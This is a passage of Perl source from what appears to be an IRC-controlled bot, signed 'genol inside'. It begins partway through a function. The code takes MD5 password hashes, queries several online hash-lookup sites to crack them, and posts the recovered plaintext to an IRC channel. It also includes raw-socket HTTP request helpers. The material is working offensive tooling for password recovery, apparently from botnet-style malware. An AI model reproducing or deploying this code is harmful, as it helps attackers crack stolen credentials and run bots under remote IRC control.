my $cracked="$1";
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-gdataonline.com ==> ".$cracked."");
} else {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-gdataonline.com Has not Found.");
}}

sub redn(){
my $md5hash = $_[1];
chomp $md5hash;
my $query = "http://md5.rednoize.com/?p&s=md5&q=".$md5hash;
my $checker = query($query);
if ($checker =~ m/<(.*)/g) {
my $cracked="$1";
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-rednoize.com  ==> ".$cracked);
} else {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-rednoize.com Has not Found.");
}}

sub xpz(){
my $md5hash = $_[1];
chomp $md5hash;
my $query = "http://md5.xpzone.de/?string=".$md5hash."&mode=decrypt";
my $checker = query($query);
if ($checker =~ m/<b>(.*)<\/b>/g) {
my $cracked="$1";
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-xpzone.de  ==> ".$cracked);
} else {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-xpzone.de  Has not Found.");
}}

sub ben(){
my $md5hash = $_[1];
chomp $md5hash;
my $query = "http://md5.benramsey.com/md5.php?hash=".$md5hash;
my $checker = query($query);
if ($checker =~ m/<string><\!\[CDATA\[(.+?)\]\]><\/string>/g) {
my $cracked="$1";
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-benramsey.com  ==> ".$cracked);
} else {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-benramsey.com  Has not Found.");
}}

sub alim(){
my $md5hash = $_[1];
chomp $md5hash;
my $query = "http://alimamed.pp.ru/md5/?md5e=&md5d=".$md5hash;
my $checker = query($query);
if ($checker =~ m/<b>(.+?)<\/b>/g) {
my $cracked="$1";
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-alimamed.pp.ru  ==> ".$cracked);
} else {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-alimamed.pp.ru  Has not Found.");
}}

sub cry(){
my $md5hash = $_[1];
chomp $md5hash;
my $query = "http://us.md5.crysm.net/find?md5=".$md5hash;
my $checker = query($query);
if ($checker =~ m/<li>(.+?)<\/li>/g) {
my $cracked="$1";
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-crysm.net  ==> ".$cracked);
} else {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12 MD5-crysm.net  Has not Found.");
}}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}
#########
# genol inside #
#########